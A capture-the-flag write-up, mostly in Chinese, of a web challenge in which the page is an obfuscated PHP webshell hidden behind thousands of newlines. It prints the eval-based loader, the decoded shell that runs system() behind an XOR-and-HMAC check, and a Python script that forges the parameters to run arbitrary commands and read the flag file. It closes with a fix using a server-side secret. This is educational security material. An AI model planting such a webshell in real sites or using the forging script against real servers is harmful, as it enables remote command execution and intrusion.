# PHM #36 Web — webshell

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 70 |

## 題目

> You have my webshell, find the flag!
>
> 連結: [`https://webshell.hackme.quest/`](https://webshell.hackme.quest/)

## 分析

Index 頁長得像空頁 (前面灌 4096 個換行), 其實是個混淆的 PHP shell. 清掉換行:

```php
<?php
$cation = "St\x72\x5fr\x4ft\x313";       // → str_rot13
$e_obfus = "b\x41Se\x364\x5f\x44e\x43ode"; // → base64_decode
$e_cod = "g\x5ainfl\x41t\x45";             // → gzinflate
$sourc = "St\x72\x72\x45v";                // → strrev
@eval($sourc($e_cod($e_obfus($cation("KMSqn8...很長..."))));
```

Local 跑一次 rot13 → b64decode → gzinflate → strrev, 內層原始碼:

```php
function run() {
    if(isset($_GET['cmd']) && isset($_GET['sig'])) {
        $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
        $key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
        $sig = hash_hmac('SHA512', $cmd, $key);
        if($sig === (string)$_GET['sig']) {
            header('Content-Type: text/plain');
            return !!system($cmd);
        }
    }
    return false;
}
function fuck() {
    print(str_repeat("\n", 4096));
    readfile($_SERVER['SCRIPT_FILENAME']);
}
run() ?: fuck();
```

### 關鍵觀察

- `$cmd = sha512(REMOTE_ADDR) ^ (string)$_GET['cmd']` — 要產生真正的 shell command, 需把目標 cmd 跟 `sha512(我的IP)` XOR 送上去
- key = `UA + sha1(HOST)` — 我們全控
- sig = HMAC-SHA512(cmd, key)

**我們的 IP 是 public, 自己能查到**. UA / HOST 也是我們選的. → 可以本地算 cmd_param + sig, 就能執行任意 command.

### Flag 位置

`cmd=ls -la /var/www/html` → 看到 `.htflag` (40 bytes). `cat /var/www/html/.htflag` → flag.

## 解法

```python
import hashlib, hmac, urllib.parse, urllib.request, ssl

my_ip = '187.15.135.246'  # 自己的 outbound IP, 用 https://api.ipify.org 查
ua = 'Mozilla/5.0'
host = 'webshell.hackme.quest'
ctx = ssl.create_default_context()

def run(cmd):
    remote_hash = hashlib.sha512(my_ip.encode()).hexdigest()
    rh = remote_hash.encode()[:len(cmd)]
    cmd_param = bytes(a^b for a, b in zip(cmd.encode(), rh))
    host_hash = hashlib.sha1(host.encode()).hexdigest()
    key = ua + host_hash
    sig = hmac.new(key.encode(), cmd.encode(), hashlib.sha512).hexdigest()
    url = f'https://{host}/?cmd={urllib.parse.quote(cmd_param)}&sig={sig}'
    req = urllib.request.Request(url, headers={'User-Agent': ua})
    return urllib.request.urlopen(req, context=ctx).read().decode()

print(run('cat /var/www/html/.htflag'))
```

## Flag

```
FLAG{Webshell? I only know sea shell~!}
```

## 感想

Shell 設計者**自以為** XOR + HMAC-SHA512 很安全, 但問題在 XOR mask (`sha512(REMOTE_ADDR)`) 是**完全可預測**的 — 攻擊者查自己 outbound IP 就能算. 另外 HMAC key 的 secret 來源也是 attacker-controlled (UA + HOST). 等於**只是把 cmd/sig 做了一輪 encoding 就送回來**, 沒有任何真正的 secret.

修法: HMAC key 要用**server-side secret**, 不能把 request 元資料當 key.
